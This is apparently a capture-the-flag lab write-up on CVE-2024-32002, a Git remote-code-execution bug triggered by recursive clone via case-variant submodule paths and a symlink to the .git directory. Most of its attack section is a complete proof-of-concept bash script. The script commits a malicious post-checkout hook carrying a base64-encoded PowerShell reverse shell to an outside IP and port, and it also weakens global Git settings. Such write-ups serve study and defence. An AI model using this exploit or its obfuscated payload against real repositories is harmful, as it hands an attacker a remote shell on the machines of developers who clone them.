---
description: CVE-2024-32002 | Submodule | Hook | Symlink | post-checkout |
---

# GIT RCE via git clone

CVE-2024-32002 is a Remote Code Execution (RCE) vulnerability in Git submodules. The provided exploit demonstrates how a malicious payload (leading to RCE) can be triggered via a recursive clone of a Git repository.

{% embed url="https://www.youtube.com/watch?ab_channel=SnapAttack&t=374s&v=Alqi65ZmLi4" %}

> This post showcases the exploit for a git RCE where its being fooled to overwrite the post checkout hook script and execute commands.

### <mark style="color:yellow;">How does it work?</mark>

Also check: [https://www.vicarius.io/vsociety/posts/exploiting-git-rce-cve-2024-3200](https://www.vicarius.io/vsociety/posts/exploiting-git-rce-cve-2024-32002). The bug lies in the case-insensitive file systems treating paths like `A/modules/x` and `a/modulesx` as identical. Because of this we can craft a malicious symlink with the a submodule. If we name the symlink with a case variaton of the submodule's path like `A/modules/x` but pointing it to the submodule's hidden .git directory.&#x20;

<table><thead><tr><th width="204">Term</th><th>Description</th></tr></thead><tbody><tr><td>symlink</td><td>A pointer or path to the target file or directory</td></tr><tr><td>submodule</td><td>Include another Git repository as a subdirectory within your main repository</td></tr><tr><td>hooks</td><td>custom scripts that run automatically or after a push</td></tr><tr><td>post-checkout</td><td>A <strong>post-checkout</strong> hook is a script that runs automatically after a <code>git checkout</code> command</td></tr><tr><td>commit</td><td><strong>Git commit</strong> saves changes to the repository</td></tr></tbody></table>

In repo1 we save the post-checkout with our payload . Which we chmod in our script to make it executable.&#x20;

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

In repo 2 add submodule `x/y`, pull repo1 and place submodule in `A/modules/x`.

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Finally we create `a` symlink which points to .git which references Git repository's metadata directory. Its now possible to run hook scripts from repo1 by calling repo2 and will run scripts from the core Git repository, the `.git` directory.

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
The `.git` directory is the core of a Git repository with commit details, confg files, API keys, passwords. It's essentially the brain of Git version control.
{% endhint %}

### <mark style="color:yellow;">Running the exploit</mark>

Got this script from [https://github.com/safebuffer/CVE-2024-32002/blob/main/poc.sh](https://github.com/safebuffer/CVE-2024-32002/blob/main/poc.sh).&#x20;

```bash
#!/bin/bash

# Set Git configuration
git config --global protocol.file.allow always
git config --global core.symlinks true

# optional, to avoid the warning message
git config --global init.defaultBranch main 

# Initialize the repo1
git clone http://compiled.htb:3000/mczen/repo1.git
cd repo1
mkdir -p y/hooks

# Payload
cat > y/hooks/post-checkout <<EOF
#!bin/sh.exe
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
EOF

# Make the hook executable
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push
cd ..

# Initialize repo2
git clone http://compiled.htb:3000/mczen/repo2.git
cd repo2
git submodule add --name x/y "http://compiled.htb:3000/mczen/repo1.git" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git push

git clone --recursive http://compiled.htb:3000/mczen/repo2.git
```

